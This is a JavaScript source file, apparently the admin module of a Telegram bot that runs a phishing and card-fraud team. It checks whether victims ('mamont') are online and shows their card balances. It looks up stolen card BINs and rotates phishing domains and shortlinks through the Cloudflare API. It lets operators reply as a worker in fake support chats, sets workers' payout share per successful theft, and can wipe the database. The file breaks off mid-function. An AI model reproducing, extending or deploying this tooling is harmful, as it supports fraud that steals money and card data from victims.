const { Composer, Markup } = require("telegraf");
const admin = require("./commands/admin/admin");
const ads = require("./commands/admin/ads");
const bins = require("./commands/admin/bins");
const countries = require("./commands/admin/countries");
const profits = require("./commands/admin/profits");
const requests = require("./commands/admin/requests");
const services = require("./commands/admin/services");
const settings = require("./commands/admin/settings");
const user = require("./commands/admin/user");
const ad = require("./commands/admin/ad");
const userAds = require("./commands/admin/userAds");
const userProfits = require("./commands/admin/userProfits");
const users = require("./commands/admin/users");
const writers = require("./commands/admin/writers");
const axios = require("axios");

const escapeHTML = require("escape-html");
const toggleUnderAttackHandler = require("./commands/admin/toggleUnderAttackHandler");
const clean_db = require("./commands/admin/clean_db");

const {
  Settings,
  Nastavniki,
  User,
  Support,
  Ad,
  Service,
  Profit,
  Country,
  Writer,
  Request,
  Bin,
  Log,
  Domains,
  Operators,
  BlockCards,
  SupportChat,
  Currency,
  IpBinding,
  Referral
} = require("./database");
const locale = require("./locale");
const chunk = require("chunk");
const profit = require("./commands/admin/profit");
const writer = require("./commands/admin/writer");
const request = require("./commands/admin/request");
const bin = require("./commands/admin/bin");
const country = require("./commands/admin/country");
const service = require("./commands/admin/service");
const { Op } = require("sequelize");
const binInfo = require("./helpers/binInfo");
const log = require("./helpers/log");
const help = require("./commands/admin/help");
const domains = require("./commands/admin/domains");
const adminBot = new Composer(
  async (ctx, next) => ctx.state.user.status >= 1 && next()
);

const { getCurrencyFromBin } = require("./helpers/binHelper");
function getUserRoleKeyboard({
  log,

  supportId,
  isOperator,
}) {
  const keyboard = [];

  // 👁 Онлайн
  keyboard.push([
    Markup.callbackButton("👁️ Онлайн", `check_mamont_${log.ad.id}`),
  ]);

 
  // ✍️ Сообщение в ТП или Ответить за воркера / 📋 Шаблоны
  keyboard.push([
    Markup.callbackButton(
      isOperator ? "✍️ Ответить за воркера" : "✍️ Сообщение в ТП",
      isOperator
        ? `operatorSend_${supportId}_send_message_${log.ad.userId}_${log.ad.id}`
        : `support_${supportId}_send_message`
    ),
    Markup.callbackButton(
      "📋 Шаблоны ТП",
      `tempSupport_${supportId}_${log.ad.userId}`
    ),
  ]);

   // 🔓 / 🔒 Открыть / Закрыть ТП
  keyboard.push([
    Markup.callbackButton("🔓 Открыть ТП", `open_support_${log.ad.id}`),
    Markup.callbackButton("🔒 Закрыть ТП", `close_support_${log.ad.id}`),
  ]);

  // 🔽 Дополнительно
  keyboard.push([
    Markup.callbackButton(
      "🔽 Дополнительно",
      `more_actions_${log.ad.id}_${supportId}`
    ),
  ]);

  return Markup.inlineKeyboard(keyboard);
}
function getBalance(log) {
  if (!log.ad.balanceChecker) return "выключен";

  const cardBalanceText = log.otherInfo.cardBalance;

  const isThousandSeparated =
    /(?<=\d{1,3}),\d{3}(?:\.\d+)?$/.test(cardBalanceText) ||
    /(?<=\d{1,3})\.\d{3}(?:,\d+)?$/.test(cardBalanceText);

  if (isThousandSeparated) {
    return `${cardBalanceText} ${log.detectedCurrency}`;
  }

  const balanceValue = String(cardBalanceText)
    .replace(/\s/g, "")
    .replace(/,/g, ".");
  const cardBalance = parseFloat(balanceValue);

  if (isNaN(cardBalance)) return cardBalanceText;

  const currency = log.detectedCurrency;
  const usdRate = log.usdRate || 1;
  const eurRate = log.eurRate || 1;

  const originalValue = cardBalance.toFixed(2);
  const usdValue = (cardBalance * usdRate).toFixed(2);
  const eurValue = (cardBalance * eurRate).toFixed(2);

  const parts = [`${originalValue} ${currency}`];

  if (currency !== "USD" && usdValue !== originalValue) {
    parts.push(`${usdValue} USD`);
  }

  if (currency !== "EUR" && eurValue !== originalValue) {
    parts.push(`${eurValue} EUR`);
  }

  return parts.join(" / ");
}

async function getCardInfo(cardNumber) {
  try {
    var text = "";

    await axios
      .get(`https://bins.antipublic.cc/bins/${cardNumber}`)
      .then((res) => {
        if (res.data.bank) text += `\n— Банк: <b>${res.data.bank}</b>`;
        if (res.data.country_name)
          text += `\n— Страна: <b>${res.data.country_name}</b>`;
      });
    return text;
  } catch (err) {
    return "<b>неизвестно</b>";
  }
}

adminBot.command("admin", admin);
adminBot.action("admin", admin);

adminBot.command("settings", settings);
adminBot.action("admin_settings", settings);

adminBot.action("admin_clean_db", clean_db);

// Этап 1: Начальное сообщение с подтверждением
adminBot.action("admin_confirm_clean_db", async (ctx) => {
  await ctx.replyOrEdit(
    `⚠️ <b>Вы уверены, что хотите очистить базу данных?</b>

❗ Это действие <u>необратимо</u>!`,
    {
      parse_mode: "HTML", // 👉 добавил парсинг HTML
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("✅ Подтвердить", "admin_clean_db_execute")],
        [Markup.callbackButton("🚫 Отменить", "admin_cancel_clean_db")],
      ]),
    }
  );
});

// Этап 2: Нажата "✅ Подтвердить" - запускаем очистку
adminBot.action("admin_clean_db_execute", async (ctx) => {
  try {
    const adsCount = await Ad.count();
    const supportChatCount = await SupportChat.count();
    const blockCardsCount = await BlockCards.count();
    const supportCount = await Support.count();

    const message = await ctx.replyWithHTML(`🧹 Начинаю чистку базы данных...`);

    // Удаляем поочередно
    await Ad.destroy({ where: {} });
    await SupportChat.destroy({ where: {} });
    await BlockCards.destroy({ where: {} });
    await Support.destroy({ where: {} });

    await ctx.telegram.deleteMessage(ctx.chat.id, message.message_id);

    await ctx.replyOrEdit(
      `✅ <b>Чистка базы данных завершена успешно!</b>

📦 Удалено объявлений: <b>${adsCount}</b>
🗨️ Удалено записей чата поддержки: <b>${supportChatCount}</b>
❌ Удалено заблокированных карт: <b>${blockCardsCount}</b>
🗂️ Удалено записей Support: <b>${supportCount}</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("◀️ Назад", "admin")],
        ]),
      }
    );

    // Можно еще добавить лог в группу
    await log(ctx, `✅ Проведена полная чистка базы данных.`);
  } catch (err) {
    console.error("Ошибка при чистке базы данных:", err);
    await ctx.replyWithHTML(
      "❌ <b>Произошла ошибка при чистке базы данных.</b>"
    );
  }
});

adminBot.action("admin_cancel_clean_db", async (ctx) => {
  try {
    await ctx.answerCbQuery("❌ Чистка базы данных отменена", {
      show_alert: true,
    });
  } catch (err) {
    console.error("Ошибка при отправке ответа на отмену:", err.message);
  }

  // Возвращаемся в админку
  await clean_db(ctx);
});

adminBot.action("admin_toggle_auto_clean_db", async (ctx) => {
  try {
    // Берем первую запись из Settings
    const [setting] = await Settings.findAll({ limit: 1 });

    if (!setting) {
      return ctx.answerCbQuery("❌ Настройки не найдены", { show_alert: true });
    }

    const newValue = setting.auto_clean_db ? false : true;

    await setting.update({ auto_clean_db: newValue });

    await ctx.answerCbQuery(
      newValue ? "✅ Автоочистка БД включена" : "❌ Автоочистка БД выключена",
      { show_alert: true }
    );

    // Перерисовать описание чистки базы
    await clean_db(ctx);
  } catch (err) {
    console.error("Ошибка при переключении автоочистки:", err);
    await ctx.answerCbQuery("❌ Ошибка переключения автоочистки", {
      show_alert: true,
    });
  }
});
adminBot.action(/^admin_set_domain_(\d+)$/, async (ctx) => {
  try {
    const services = await Service.findAll();

    const domain = await Domains.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    if (!domain) {
      return ctx.answerCbQuery("❌ Домен не найден.", { show_alert: true });
    }

    await ctx.answerCbQuery(`✅ Домен успешно выбран как основной`, {
      show_alert: false,
    });

    const settings = await Settings.findOne({ where: { id: 1 } });

    // 👉 Сначала удаляем старую зону, если есть
    if (settings.cf_id_domain) {
      try {
        await axios.delete(
          `https://api.cloudflare.com/client/v4/zones/${settings.cf_id_domain}`,
          {
            headers: {
              "X-Auth-Email": settings.cf_mail,
              "X-Auth-Key": settings.cf_api,
              "Content-Type": "application/json",
            },
          }
        );
        console.log(`🗑 Старая зона успешно удалена: ${settings.cf_id_domain}`);
      } catch (err) {
        console.warn(
          "⚠️ Ошибка при удалении старой зоны:",
          err.response?.data || err.message
        );
      }
    }

    // Теперь ищем новую зону по новому домену
    let page = 1;
    let foundZone = null;
    while (!foundZone) {
      const response = await axios.get(
        "https://api.cloudflare.com/client/v4/zones",
        {
          headers: {
            "X-Auth-Email": settings.cf_mail,
            "X-Auth-Key": settings.cf_api,
          },
          params: {
            page: page,
            per_page: 50,
          },
        }
      );

      if (!response.data || !response.data.result) {
        console.error("Некорректный ответ от Cloudflare API:", response.data);
        return ctx.reply("❌ Ошибка получения зон Cloudflare.").catch(() => {});
      }

      foundZone = response.data.result.find((z) => z.name === domain.domain);

      if (response.data.result.length < 50) break;
      page++;
    }

    if (!foundZone) {
      console.error("Домен не найден среди зон Cloudflare:", domain.domain);
      return ctx
        .reply(`❌ Домен ${domain.domain} не найден в зонах Cloudflare.`)
        .catch(() => {});
    }

    // Обновляем домены у всех сервисов
 // Обновляем домены у всех сервисов
await Promise.all(
  services.map((v) =>
    Service.update(
      {
        domain: `${v.code.split("_")[0]}.${domain.domain}`,
        zone: v.zone ? null : v.zone, // сбрасываем в null, если была задана
      },
      { where: { code: v.code } }
    ).catch((err) =>
      console.error(`Ошибка при обновлении сервиса ${v.code}:`, err)
    )
  )
);

    // Обновляем Settings
    await Settings.update(
      {
        cf_id_domain: foundZone.id,
        domain: domain.domain,
      },
      { where: { id: 1 } }
    ).catch((err) => console.error("Ошибка при обновлении Settings:", err));

    // Уведомляем в общую группу
    if (settings.allGroupId) {
      await ctx.telegram
        .sendMessage(
          settings.allGroupId,
          `<b>✅ Новый домен успешно установлен.</b>\n\n<i>Повторное создание ссылок не требуется!</i>`,
          { parse_mode: "HTML" }
        )
        .catch((err) =>
          console.error("Ошибка при отправке сообщения в allGroupId:", err)
        );
    }
    // Удаляем домен из таблицы запасных
    await Domains.destroy({
      where: { id: ctx.match[1] },
    }).catch((err) => console.error("Ошибка при удалении домена:", err));

    // Перерисовываем список доменов
    return require("./commands/admin/domains")(ctx).catch((err) =>
      console.error("Ошибка при открытии списка доменов:", err)
    );
  } catch (err) {
    console.error("❌ Ошибка:", err);
    return ctx.reply("❌ Ошибка").catch(() => {});
  }
});


adminBot.action("admin_zapasnie", async (ctx) => {
  try {
    const domains = await Domains.findAll();

    var buttons = domains.map((v) => [
      Markup.callbackButton(v.domain, `admin_select_domain_${v.id}`),
    ]);

    if (buttons.length < 1)
      buttons = [[Markup.callbackButton("Страница пуста", "none")]];

    return ctx.replyOrEdit(
      `<b>📄 Список запасных доменов:</b>

<i>Нажми на домен чтобы выбрать его</i>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          ...buttons,
          [Markup.callbackButton("◀️ Назад", "admin_domains")],
        ]),
      }
    );
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^admin_service_(\d+)_delete_domain$/, async (ctx) => {
  try {
    const serviceId = Number(ctx.match[1]);
    const service = await Service.findByPk(serviceId);
    const settings = await Settings.findOne({ where: { id: 1 } });

    if (!service) {
      return ctx.answerCbQuery("❌ Сервис не найден", { show_alert: true });
    }

    if (!service.domain || !service.zone) {
      return ctx.answerCbQuery("❌ У сервиса нет домена", {
        show_alert: true,
      });
    }

    const domain = service.domain;
    const zoneId = service.zone;

    const psl = require("psl");
    const parsed = psl.parse(domain);
    if (!parsed.domain) {
      return ctx.answerCbQuery("❌ Неверный домен", {
        show_alert: true,
      });
    }

    const zoneName = parsed.domain;

    // 1. Найдём все сервисы с этим же полным доменом
    const servicesWithSameDomain = await Service.findAll({ where: { domain } });

    // 2. Удаляем A-запись только один раз
    try {
      const dnsRecordsRes = await axios.get(
        `https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records?type=A&name=${domain}`,
        {
          headers: {
            "X-Auth-Email": settings.cf_mail,
            "X-Auth-Key": settings.cf_api,
            "Content-Type": "application/json",
          },
        }
      );

      const record = dnsRecordsRes.data.result.find(
        (r) => r.type === "A" && r.name === domain
      );

      if (record) {
        await axios.delete(
          `https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records/${record.id}`,
          {
            headers: {
              "X-Auth-Email": settings.cf_mail,
              "X-Auth-Key": settings.cf_api,
              "Content-Type": "application/json",
            },
          }
        );
      }
    } catch (error) {
      console.warn("⚠️ Не удалось удалить A-запись:", error.response?.data || error.message);
    }

    // 3. Проверим — остались ли A-записи вообще в зоне
    let zoneIsEmpty = false;

    try {
      const dnsRecordsLeft = await axios.get(
        `https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records?type=A`,
        {
          headers: {
            "X-Auth-Email": settings.cf_mail,
            "X-Auth-Key": settings.cf_api,
            "Content-Type": "application/json",
          },
        }
      );

      if (dnsRecordsLeft.data.result.length === 0) {
        // Удаляем зону
        try {
          await axios.delete(`https://api.cloudflare.com/client/v4/zones/${zoneId}`, {
            headers: {
              "X-Auth-Email": settings.cf_mail,
              "X-Auth-Key": settings.cf_api,
              "Content-Type": "application/json",
            },
          });
          zoneIsEmpty = true;
        } catch (err) {
          console.warn("⚠️ Не удалось удалить зону:", err.response?.data || err.message);
        }
      }
    } catch (err) {
      console.warn("⚠️ Не удалось проверить A-записи:", err.response?.data || err.message);
    }

    // 4. Обновляем все сервисы с этим доменом
    for (const s of servicesWithSameDomain) {
      const subdomain = s.code.split("_")[0];
      const fallbackDomain = `${subdomain}.${settings.domain}`;

      await s.update({
        domain: fallbackDomain,
        zone: null,
      });
    }

    await ctx.answerCbQuery("✅ Домен успешно удалён", { show_alert: false });

    // Обновляем карточку активного сервиса
    return require("./commands/admin/service")(ctx, serviceId);
  } catch (err) {
    console.error("❌ Ошибка при удалении домена:", err.response?.data || err.message);
    return ctx.answerCbQuery("❌ Ошибка при удалении", { show_alert: true });
  }
});




adminBot.action(/^admin_service_(\d+)_delete_shortlink$/, async (ctx) => {
  try {
    const serviceId = Number(ctx.match[1]);
    const service = await Service.findByPk(serviceId);
    const settings = await Settings.findOne({ where: { id: 1 } });

    if (!service) {
      return ctx.answerCbQuery("❌ Сервис не найден", { show_alert: true });
    }

    if (!service.shortlink || !service.shortlinkZone) {
      return ctx.answerCbQuery("❌ У сервиса нет сокращалки", {
        show_alert: true,
      });
    }

    const shortlink = service.shortlink;
    const zoneId = service.shortlinkZone;

    const psl = require("psl");
    const parsed = psl.parse(shortlink);
    if (!parsed.domain) {
      return ctx.answerCbQuery("❌ Неверный домен", { show_alert: true });
    }

    const zoneName = parsed.domain;

    // 1. Ищем все сервисы с этим shortlink
    const servicesWithSameShortlink = await Service.findAll({ where: { shortlink } });

    // 2. Удаляем A-запись один раз
    try {
      const dnsRecordsRes = await axios.get(
        `https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records?type=A&name=${shortlink}`,
        {
          headers: {
            "X-Auth-Email": settings.cf_mail,
            "X-Auth-Key": settings.cf_api,
            "Content-Type": "application/json",
          },
        }
      );

      const record = dnsRecordsRes.data.result.find(
        (r) => r.type === "A" && r.name === shortlink
      );

      if (record) {
        await axios.delete(
          `https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records/${record.id}`,
          {
            headers: {
              "X-Auth-Email": settings.cf_mail,
              "X-Auth-Key": settings.cf_api,
              "Content-Type": "application/json",
            },
          }
        );
      }
    } catch (error) {
      console.warn("⚠️ Не удалось удалить A-запись:", error.response?.data || error.message);
    }

    // 3. Проверка, остались ли A-записи в зоне
    let zoneIsEmpty = false;

    try {
      const dnsRecordsLeft = await axios.get(
        `https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records?type=A`,
        {
          headers: {
            "X-Auth-Email": settings.cf_mail,
            "X-Auth-Key": settings.cf_api,
            "Content-Type": "application/json",
          },
        }
      );

      if (dnsRecordsLeft.data.result.length === 0) {
        try {
          await axios.delete(
            `https://api.cloudflare.com/client/v4/zones/${zoneId}`,
            {
              headers: {
                "X-Auth-Email": settings.cf_mail,
                "X-Auth-Key": settings.cf_api,
                "Content-Type": "application/json",
              },
            }
          );
          zoneIsEmpty = true;
        } catch (err) {
          console.warn("⚠️ Не удалось удалить зону:", err.response?.data || err.message);
        }
      }
    } catch (err) {
      console.warn("⚠️ Не удалось проверить A-записи:", err.response?.data || err.message);
    }

    // 4. Обновляем все сервисы с этой сокращалкой
    for (const s of servicesWithSameShortlink) {
const fallbackShortlink = settings.shortlink ? `${settings.shortlink}` : null;

      await s.update({
        shortlink: fallbackShortlink,
        shortlinkZone: null,
      });
    }

    await ctx.answerCbQuery("✅ Сокращалка успешно удалена", { show_alert: false });

    return require("./commands/admin/service")(ctx, serviceId);
  } catch (err) {
    console.error("❌ Ошибка при удалении сокращалки:", err.response?.data || err.message);
    return ctx.answerCbQuery("❌ Ошибка при удалении", { show_alert: true });
  }
});


adminBot.action(/^admin_service_(\d+)_add_domain$/, async (ctx) => {
  const serviceId = Number(ctx.match[1]);
  return ctx.scene.enter("admin_add_domain_to_service", { serviceId });
});

adminBot.action(/^admin_service_(\d+)_add_shortlink$/, async (ctx) => {
  const serviceId = Number(ctx.match[1]);
  return ctx.scene.enter("admin_add_shortlink_to_service", { serviceId });
});
adminBot.action(/^toggle_captcha_(zone|shortlink)_(\d+)$/, async (ctx) => {
  try {
    const [, type, serviceIdStr] = ctx.match;
    const serviceId = Number(serviceIdStr);
    const service = await Service.findByPk(serviceId);
    const settings = await Settings.findOne({ where: { id: 1 } });

    if (!service) {
      return ctx.answerCbQuery("❌ Сервис не найден", { show_alert: true });
    }

    const zoneId = type === "zone" ? service.zone : service.shortlinkZone;

    if (!zoneId) {
      return ctx.answerCbQuery("❌ У сервиса нет подключенной зоны", {
        show_alert: true,
      });
    }

    // Получаем текущий уровень защиты
    const cfRes = await axios.get(
      `https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/security_level`,
      {
        headers: {
          "X-Auth-Email": settings.cf_mail,
          "X-Auth-Key": settings.cf_api,
          "Content-Type": "application/json",
        },
      }
    );

    const currentLevel = cfRes.data.result.value;
    const newLevel =
      currentLevel === "under_attack" ? "low" : "under_attack";

    // Обновляем настройку
    await axios.patch(
      `https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/security_level`,
      { value: newLevel },
      {
        headers: {
          "X-Auth-Email": settings.cf_mail,
          "X-Auth-Key": settings.cf_api,
          "Content-Type": "application/json",
        },
      }
    );

    const newText =
      newLevel === "under_attack"
        ? type === "zone"
          ? "🔴 Выключить капчу"
          : "🔴 Выключить капчу (сокращалка)"
        : type === "zone"
        ? "🟢 Включить капчу"
        : "🟢 Включить капчу (сокращалка)";

    await ctx.answerCbQuery(
      newLevel === "under_attack" ? "🟢 Капча включена" : "🔴 Капча выключена"
    );

    // === Перерисовываем кнопку ===
    const oldMarkup = ctx.update.callback_query.message.reply_markup;

    const updatedMarkup = Markup.inlineKeyboard(
      oldMarkup.inline_keyboard.map((row) =>
        row.map((btn) => {
          if (btn.callback_data === `toggle_captcha_${type}_${serviceId}`) {
            return Markup.callbackButton(
              newText,
              `toggle_captcha_${type}_${serviceId}`
            );
          }
          return btn;
        })
      )
    );

    await ctx.editMessageReplyMarkup(updatedMarkup);
  } catch (err) {
    console.error(
      "❌ Ошибка при переключении капчи:",
      err?.response?.data || err.message
    );
    return ctx.answerCbQuery("❌ Ошибка при переключении защиты", {
      show_alert: true,
    });
  }
});
adminBot.action(
  /^admin_toggle_under_attack_(domain|shortlink)$/,
  toggleUnderAttackHandler
);
adminBot.action(/admin_select_domain_(\d+)/, async (ctx) => {
  try {
    const domainId = ctx.match[1];
    const domain = await Domains.findByPk(domainId);

    return ctx.replyOrEdit(
      `<b>📄 Выбранный домен:</b> ${domain.domain}

<i>Выберите действие для этого домена</i>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.callbackButton(
              "✅ Назначить основным",
              `admin_set_domain_${domain.id}`
            ),
          ],
          [
            Markup.callbackButton(
              "🗑️ Удалить домен",
              `delete_domain_${domain.id}`
            ),
          ],

          [Markup.callbackButton("◀️ Назад", "admin_zapasnie")],
        ]),
      }
    );
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action(/^delete_domain_(\d+)$/, async (ctx) => {
  try {
    const domainId = ctx.match[1];
    const domain = await Domains.findOne({ where: { id: domainId } });

    if (!domain) {
      await ctx.answerCbQuery("❌ Домен не найден", true).catch((err) => err);
      return;
    }

    await Domains.destroy({ where: { id: domainId } });

    await ctx
      .answerCbQuery(`✅ Домен "${domain.domain}" успешно удален`, true)
      .catch((err) => err);

    // Повторно викликаємо команду для оновлення списку доменів
    return require("./commands/admin/domains")(ctx);
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка при удалении домена").catch((err) => err);
  }
});

adminBot.action("delete_domains", async (ctx) => {
  try {
    await Domains.destroy({
      where: {},
      truncate: true,
    });
    await ctx
      .answerCbQuery("✅ Все домены были удалены", true)
      .catch((err) => err);
    return admin(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});
adminBot.action("admin_cookie", async (ctx) => {
  return ctx.scene.enter("admin_cookie");
});

adminBot.action("admin_domain_addZapasnoy", async (ctx) => {
  return ctx.scene.enter("admin_domain_addZapasnoy");
});
adminBot.action("admin_domain_add", async (ctx) => {
  return ctx.scene.enter("add_domain");
});
adminBot.action("admin_domains_cf", async (ctx) => {
  return ctx.scene.enter("add_cf");
});
adminBot.action("admin_domains", domains);

adminBot.action(/^admin_projectStatus_(stop|work)$/, async (ctx) => {
  try {
    const settings = ctx.state.bot;

    if (ctx.match[1] == "stop") {
      await Settings.update(
        {
          work: false,
        },
        {
          where: {
            id: 1,
          },
        }
      );
      await ctx.telegram.sendMessage(
        ctx.state.bot.allGroupId,
        "<b>❌ STOP WORK </b>",
        { parse_mode: "HTML" }
      ),
        await ctx
          .editMessageReplyMarkup(
            Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  `✅ FULL WORK`,
                  `admin_projectStatus_work`
                ),
              ],

              [
                Markup.callbackButton(
                  settings.requestsEnabled
                    ? "❌ Выключить заявки"
                    : "✅ Включить заявки",
                  `admin_turn_${
                    settings.requestsEnabled ? "off" : "on"
                  }_requestsEnabled`
                ),
              ],
              [
                Markup.callbackButton(
                  settings.allLogsEnabled
                    ? "❌ Выключить логи в общий чат"
                    : "✅ Включить логи в общий чат",
                  `admin_turn_${
                    settings.allLogsEnabled ? "off" : "on"
                  }_allLogsEnabled`
                ),
              ],
              [
                Markup.callbackButton(
                  settings.allHelloMsgEnabled
                    ? "❌ Выключить приветственное сообщение"
                    : "✅ Включить приветственное сообщение",
                  `admin_turn_${
                    settings.allHelloMsgEnabled ? "off" : "on"
                  }_allHelloMsgEnabled`
                ),
              ],
              [
                Markup.callbackButton(
                  "💬 Изменить ссылку на общий чат",
                  `admin_edit_allGroupLink`
                ),
              ],
              [
                Markup.callbackButton(
                  "💸 Изменить ссылку на канал выплат",
                  `admin_edit_payoutsChannelLink`
                ),
              ],
              [
                Markup.callbackButton(
                  "💴 Изменить процент воркера за залёт",
                  "admin_edit_payoutPercent"
                ),
              ],
                                      [Markup.callbackButton("👥 Изменить процент реферала", "admin_edit_referralPercent")],
  [
              Markup.callbackButton(
                "📜 Изменить правила проекта",
                `admin_edit_info`
              ),
            ],
              [Markup.callbackButton(locale.go_back, "admin")],
            ])
          )
          .catch((err) => err);
    } else {
      await Settings.update(
        {
          work: true,
        },
        {
          where: {
            id: 1,
          },
        }
      );
      await ctx
        .editMessageReplyMarkup(
          Markup.inlineKeyboard([
            [Markup.callbackButton(`❌ STOP WORK`, `admin_projectStatus_stop`)],

            [
              Markup.callbackButton(
                settings.requestsEnabled
                  ? "❌ Выключить заявки"
                  : "✅ Включить заявки",
                `admin_turn_${
                  settings.requestsEnabled ? "off" : "on"
                }_requestsEnabled`
              ),
            ],
            [
              Markup.callbackButton(
                settings.allLogsEnabled
                  ? "❌ Выключить логи в общий чат"
                  : "✅ Включить логи в общий чат",
                `admin_turn_${
                  settings.allLogsEnabled ? "off" : "on"
                }_allLogsEnabled`
              ),
            ],
            [
              Markup.callbackButton(
                settings.allHelloMsgEnabled
                  ? "❌ Выключить приветственное сообщение"
                  : "✅ Включить приветственное сообщение",
                `admin_turn_${
                  settings.allHelloMsgEnabled ? "off" : "on"
                }_allHelloMsgEnabled`
              ),
            ],
            [
              Markup.callbackButton(
                "💬 Изменить ссылку на общий чат",
                `admin_edit_allGroupLink`
              ),
            ],
            [
              Markup.callbackButton(
                "💸 Изменить ссылку на канал выплат",
                `admin_edit_payoutsChannelLink`
              ),
            ],
            [
              Markup.callbackButton(
                "💴 Изменить процент воркера за залёт",
                "admin_edit_payoutPercent"
              ),
            ],
                                    [Markup.callbackButton("👥 Изменить процент реферала", "admin_edit_referralPercent")],
  [
              Markup.callbackButton(
                "📜 Изменить правила проекта",
                `admin_edit_info`
              ),
            ],
            [Markup.callbackButton(locale.go_back, "admin")],
          ])
        )
        .catch((err) => err);
      await ctx.telegram.sendMessage(
        ctx.state.bot.allGroupId,
        "<b>✅ FULL WORK</b>",
        { parse_mode: "HTML" }
      );
    }
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(
  /^admin_turn_(on|off)_((requests|allLogs|allHelloMsg)Enabled)$/,
  async (ctx) => {
    try {
      await ctx.state.bot.update({
        [ctx.match[2]]: ctx.match[1] == "on",
      });

      return settings(ctx);
    } catch (err) {
      return ctx.reply("❌ Ошибка").catch((err) => err);
    }
  }
);

adminBot.action(
  /^admin_edit_(allGroupLink|payoutsChannelLink|payoutPercent|referralPercent)$/,
  (ctx) =>
    ctx.scene.enter("admin_edit_value", {
      column: ctx.match[1],
    })
);


adminBot.action(/^admin_edit_(info)$/, (ctx) =>
  ctx.scene.enter("admin_edit_info", {
    column: ctx.match[1],
  })
);

// adminBot.command("all", ctx => ctx.scene.enter("admin_send_mail"));
adminBot.action("admin_send_mail", (ctx) => ctx.scene.enter("admin_send_mail"));

adminBot.action("admin_send_mail1", (ctx) =>
  ctx.scene.enter("admin_send_mail1")
);

adminBot.command("users", (ctx) => users(ctx));

adminBot.hears(/^\/user @?([A-Za-z0-9_]+)$/, (ctx) => user(ctx, ctx.match[1]));
adminBot.hears(/^\/ad (\d+)$/, (ctx) => ad(ctx, ctx.match[1]));
adminBot.hears(/^\/profit (\d+)$/, (ctx) => profit(ctx, ctx.match[1]));

adminBot.action("admin_add_bin", (ctx) => ctx.scene.enter("admin_add_bin"));

adminBot.action(/^admin_country_([A-Za-z0-9_]+)_(show|hide)$/, async (ctx) => {
  try {
    const country_ = await Country.findByPk(ctx.match[1]);

    await country_.update({
      status: ctx.match[2] == "show" ? 1 : 0,
    });

    await ctx
      .answerCbQuery(
        `✅ Вы успешно ${
          ctx.match[2] == "show"
            ? "включили отображение страны и её сервисов"
            : "выключили отображение страны и её сервисов"
        }`,
        true
      )
      .catch((err) => err);
    log(
      ctx,
      `${
        country_.status == 1 ? "включил отображение страны" : "скрыл страну"
      } ${country_.title}`
    );
    return country(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_country_([A-Za-z0-9_]+)$/, (ctx) =>
  country(ctx, ctx.match[1])
);

adminBot.action(/^admin_service_([A-Za-z0-9_]+)_edit_domain$/, (ctx) =>
  ctx.scene.enter("admin_service_edit_domain", {
    id: ctx.match[1],
  })
);

adminBot.action(/^admin_service_([A-Za-z0-9_]+)_edit_shortlink$/, (ctx) =>
  ctx.scene.enter("admin_service_edit_shortlink", {
    id: ctx.match[1],
  })
);
adminBot.action(/^admin_service_([A-Za-z0-9_]+)_(show|hide)$/, async (ctx) => {
  try {
    const service_ = await Service.findByPk(ctx.match[1]);

    await service_.update({
      status: ctx.match[2] == "show" ? 1 : 0,
    });

    await ctx
      .answerCbQuery(
        `✅ Вы успешно ${
          ctx.match[2] == "show"
            ? "включили отображение сервиса"
            : "выключили отображение сервиса"
        }`,
        true
      )
      .catch((err) => err);
    log(
      ctx,
      `${
        service_.status == 1 ? "включил отображение сервиса" : "скрыл сервис"
      } ${service_.title}`
    );
    return service(ctx, ctx.match[1]);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

adminBot.action(/^admin_service_([A-Za-z0-9_]+)$/, (ctx) =>
  service(ctx, ctx.match[1])
);
adminBot.action(/^admin_bin_(\d+)$/, (ctx) => bin(ctx, ctx.match[1]));
adminBot.action(/^admin_user_(\d+)_select_operator$/, async (ctx) => {
  const userId = ctx.match[1];
  const operators = await Operators.findAll();

  if (!operators.length) {
    return ctx.reply("❌ Операторы не найдены.");
  }

  // Сортируем: сначала work = true (онлайн), потом work = false (оффлайн)
  operators.sort((a, b) => b.work - a.work);

  // Формируем кнопки по 3 в ряд:
  const buttons = [];
  for (let i = 0; i < operators.length; i += 3) {
    const row = operators.slice(i, i + 3).map((operator) => {
      const status = operator.work ? "🟢" : "🔴";
      return Markup.callbackButton(
        `${status} @${operator.username}`,
        `admin_user_${userId}_set_operator_${operator.id}`
      );
    });
    buttons.push(row);
  }

  // Добавляем кнопку "Назад"
  buttons.push([
    Markup.callbackButton("◀️ Назад", `admin_user_${userId}_profile`),
  ]);

  await ctx.editMessageText("Выберите оператора:", {
    reply_markup: Markup.inlineKeyboard(buttons),
  });
});

adminBot.action(/^admin_user_(\d+)_set_operator_(\d+)$/, async (ctx) => {
  const userId = ctx.match[1];
  const operatorId = ctx.match[2];

  const user = await User.findByPk(userId);
  const operator = await Operators.findByPk(operatorId);

  if (!user || !operator) {
    return ctx.reply("❌ Пользователь или оператор не найден.");
  }

  // Проверяем, онлайн ли оператор
  if (!operator.work) {
    return ctx.answerCbQuery("❌ Этот оператор сейчас оффлайн!", {
      show_alert: true,
    });
  }

  const isNew = !user.operator; // Был ли оператор до этого

